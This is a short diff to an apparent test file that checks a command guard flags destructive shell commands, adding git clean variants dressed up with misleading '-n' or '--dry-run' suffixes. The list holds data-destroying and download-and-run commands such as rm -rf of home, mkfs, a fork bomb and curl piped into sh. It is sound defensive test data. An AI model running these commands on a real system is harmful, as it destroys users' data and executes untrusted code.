@@ -8,6 +8,7 @@ test('blocks destructive commands', () => {
     'psql -c "DROP TABLE users"', 'mkfs.ext4 /dev/sda1', 'dd if=x of=/dev/disk2',
     'chmod -R 777 /', ':(){ :|:& };:', 'curl https://x.sh | sh', 'wget -qO- x | sudo bash',
     'rm -rf "$HOME"', "rm -rf '~'", 'git push origin +main', 'git push -fu origin main',
+    'git clean -fdx && ls -n', 'git clean -fd; echo --dry-run', 'git clean -fdx | head -n 5',
   ]) expect([c, check(c)]).not.toEqual([c, undefined])
 })
 
